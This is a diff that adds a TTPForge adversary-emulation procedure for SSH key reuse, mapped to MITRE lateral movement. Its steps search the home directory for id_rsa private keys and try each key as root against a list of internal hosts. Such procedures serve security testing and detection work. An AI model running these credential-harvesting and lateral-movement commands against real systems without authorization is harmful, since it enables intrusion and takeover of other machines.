@@ -1,0 +1,53 @@
+---
+api_version: 2.0
+uuid: e5f6a7b8-c9d0-e1f2-f5a6-b7c8d9e0f1a2
+name: SSH Key Reuse
+authors:
+  - TTPForge
+description: |
+  Leverage SSH keys for authentication to other systems.
+
+mitre:
+  tactics:
+    - "TA0008 Lateral Movement"
+  techniques:
+    - "T1021.004 Remote Services: SSH"
+
+requirements:
+  platforms:
+    - os: linux
+
+args:
+  - name: ssh_key_path
+    description: "Path to SSH private key"
+    type: string
+    default: "~/.ssh/id_rsa"
+  - name: target_list
+    description: "Comma-separated hosts"
+    type: string
+    default: "192.168.1.101,192.168.1.102"
+
+steps:
+  - name: enumerate_ssh_keys
+    description: Enumerate SSH keys on the system
+    inline: |
+      find ~ -name id_rsa 2>/dev/null || echo SSH key enumeration
+    cleanup:
+      inline: |
+        echo "SSH key reuse step complete"
+  - name: check_key_permissions
+    description: Check SSH key file permissions
+    inline: |
+      ls -la {{ .Args.ssh_key_path }}
+  - name: test_keys_against_hosts
+    description: Test SSH keys against target hosts
+    inline: |
+      for host in {{ .Args.target_list }}; do ssh -i {{ .Args.ssh_key_path }} root@$host whoami 2>/dev/null; done
+  - name: verify_ssh_key_exists
+    description: Verify SSH key exists
+    inline: |
+      test -f {{ .Args.ssh_key_path }}
+
+tests:
+  - name: dry_run_ssh_key_reuse
+    dry_run: true
